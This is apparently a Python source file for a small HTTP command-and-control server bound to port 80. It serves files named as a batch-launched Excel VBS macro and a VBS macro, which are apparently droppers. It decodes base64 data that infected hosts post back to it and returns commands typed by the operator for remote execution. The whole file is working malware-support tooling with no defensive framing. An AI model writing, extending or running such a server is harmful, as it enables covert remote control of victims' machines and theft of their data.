import socket
import threading
import base64
import re

HEADER = 64
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "STOP"
HOST = socket.gethostbyname(socket.gethostname())
# HOST = "127.0.0.1"
HOST = "10.100.1.24"
PORT = 80
SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    SERVER.bind((HOST,PORT))
    print(f'* Running on http://{HOST}:{PORT}')
except socket.error as e:
    print(f'socket error: {e}')
    print('socket error: %s' %(e))


def _start():
    SERVER.listen()
    while True:
        conn, addr = SERVER.accept()
        thread = threading.Thread(target=_handle, args=(conn, addr))
        thread.start()

def _handle(conn,addr):

    while True:
        data = conn.recv(4096).decode('utf-8')
        if not data: break
        request_line = data.split('\r\n')[0]
        request_method = request_line.split(' ')[0]
        request_url = (request_line.split(' ')[1]).strip('/')


        if request_method == 'GET' and request_url == 'BAT_EXCEL_VBS_MACRO.bat':
            print("GET\nDownloading file bat...")
            data = _read_file("BAT_EXCEL_VBS_MACRO.bat",'text/html')
            conn.send(data)
            conn.close()
            break
        if request_method == 'GET' and request_url == 'VBS_MACRO.vbs':
            print("GET\nDownloading file VBS...")
            data = _read_file("VBS_MACRO.vbs",'text/html')
            conn.send(data)
            conn.close()
            break

        print(data)
        # data = data[210:] #Remove the header of the request
        data = data[208:]
        print("\n")
        print("Decode data:")
        print(_decode64(data))
        _write_file('command.txt')
        data = _read_file('command.txt','text/html')
        print(data)
        conn.send(data)
        conn.close()
        break

#handle file for enter command

def _read_file(Name_file,Content_type):
    """Function to read the file and return the content"""
    f = open(Name_file, 'rb')
    fdata = _response_header(Content_type)
    fdata += f.read()
    return fdata

def _write_file(Name_file):
    """Function to write the file"""
    f = open(Name_file, 'w')
    print("\n")
    x = input("ServerCommand: ")
    f.write(x)
    f.close()

def _response_header(Content_type):
    """Funttion to create the header of the response"""
    message_header = 'HTTP/1.1 200 \n'
    message_header += f'Content-type: {Content_type}'
    message_header += '\r\n\r\n'
    message_header = message_header.encode()
    return message_header


# decode64

def decode_base64(data, altchars=b'+/'):
    """Function to decode base64, padding being optional"""
    data = re.sub(rb'[^a-zA-Z0-9%s]+' % altchars, b'', data)
    missing_padding = len(data) % 4
    if missing_padding:
        data += b'='* (4 - missing_padding)
    return base64.b64decode(data, altchars)

def _decode64(data):
    base64_bytes = data.encode('ascii')
    message_bytes = decode_base64(base64_bytes)
    message = message_bytes.decode('ascii')

    return message



if __name__ == '__main__':
    _start()
